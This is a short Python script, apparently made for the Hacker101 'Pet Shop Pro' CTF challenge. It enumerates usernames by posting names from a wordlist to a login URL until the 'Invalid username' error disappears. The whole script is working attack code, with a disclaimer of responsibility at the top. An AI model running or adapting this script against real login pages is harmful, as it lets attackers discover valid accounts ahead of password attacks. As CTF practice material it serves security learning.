# Quick and brutal username_enumeration
# Made for Hacker101 CTF - Pet Shop Pro
# I'm not responsible for whatever you do with this

import requests

u_name_list = 'FILL ME IN'

# read file contents into array
u_names = [line.rstrip('\n') for line in open(u_name_list)]

target_url = 'http://35.190.155.168/#######/login' 

uname_found = False

for uname in u_names:
	if not uname_found:
		print('Dorking on username: %s' % uname)
		data = {'username':uname,'password':'foo'}
		response = requests.post(target_url,data=data)
		response_dork = 'Invalid username'
		if response_dork not in response.text:
			uname_found = True
			print('Alert! Username enumerated: %s' % uname)
			exit()

